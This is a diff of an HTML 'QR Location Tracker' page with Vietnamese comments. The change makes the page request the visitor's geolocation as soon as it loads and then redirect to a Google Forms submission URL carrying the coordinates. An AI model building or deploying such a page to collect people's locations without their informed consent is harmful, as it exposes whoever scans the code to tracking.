@@ -5,25 +5,28 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>QR Location Tracker</title>
     <script>
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(showPosition, showError);
-            } else {
-                alert("Trình duyệt không hỗ trợ lấy vị trí.");
-            }
-        }
-
-        function showPosition(position) {
+    
+function showPosition(position) {
     var latitude = position.coords.latitude;
     var longitude = position.coords.longitude;
 
-    // URL của Google Forms
+    // Đường dẫn Google Forms (đã sửa lỗi chính tả từ "google.coam" thành "google.com")
     var formURL = "https://docs.google.com/forms/d/e/1FAIpQLScHfGegs79vFl5uDlv8x2BTJVw-pFp2zZzbNTRZBJCJXOw3nQ/formResponse?";
+    
+    // Thêm vị trí vào tham số `entry.6288103361519107001`
     var fullURL = formURL + "entry.6288103361519107001=" + latitude + "," + longitude;
 
-    // Tự động mở Google Forms để lưu dữ liệu
+    // Mở Google Forms để lưu vị trí
     window.location.href = fullURL;
 }
+
+// Kiểm tra xem trình duyệt có hỗ trợ Geolocation không
+if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+} else {
+    alert("Trình duyệt của bạn không hỗ trợ định vị!");
+}
+
         function showError(error) {
             switch (error.code) {
                 case error.PERMISSION_DENIED:
